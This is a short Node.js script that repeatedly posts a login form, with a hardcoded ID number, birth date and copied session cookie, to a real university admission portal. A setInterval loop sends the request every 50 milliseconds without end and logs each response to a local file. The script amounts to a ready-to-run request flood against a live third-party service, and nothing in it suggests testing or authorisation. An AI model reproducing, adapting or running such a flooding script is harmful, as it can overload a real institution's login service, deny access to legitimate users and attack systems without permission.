const axios = require('axios');
const { LoremIpsum } = require('lorem-ipsum');
const qs = require('qs');
const fs = require('fs');

const lorem = new LoremIpsum({
    sentencesPerParagraph: {
        max: 8,
        min: 4
    },
    wordsPerSentence: {
        max: 16,
        min: 4
    }
});


const filePath = 'example.txt';
let counter = 0;

// Function to write to the file
const writeToFile = () => {
    const dataToWrite = `This is line ${counter++}\n`;

    fs.appendFile(filePath, dataToWrite, (err) => {
        if (err) {
            console.error('Error writing to the file:', err);
        } else {
            console.log(`Data has been written to the file: ${dataToWrite}`);
        }
    });
};
let data = qs.stringify({
    'txtPassport': '123123321121121',
    'txtFirstname': '',
    'txtMiddlename': '',
    'txtLastname': '',
    'txtBirthday': '10/10/1992'
});
let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'https://admissionbui.bu.ac.th/Start/Login',
    headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': '_gid=GA1.3.68488310.1700663447; _gat=1; _gcl_au=1.1.1634761791.1700663447; _ga=GA1.1.512360576.1700663447; _ga_CEFV6HE3XQ=GS1.1.1700663447.1.0.1700663447.60.0.0; ASP.NET_SessionId=v2be2hvcikk55czasgjomjg1; _tt_enable_cookie=1; _ttp=3EhPFasGkzcd7pPLJEPPosQm9Mq; _ga_5VXRBFKTXM=GS1.1.1700663447.1.0.1700663451.0.0.0',
        'Origin': 'https://admissionbui.bu.ac.th',
        'Referer': 'https://admissionbui.bu.ac.th/Start/Login',

    },
    data: data
};

setInterval(() => {
    axios.request(config)
        .then((response) => {
            console.count(response.status);
            writeToFile()
        })
        .catch((error) => {
            console.log(error);
        });

}, 50);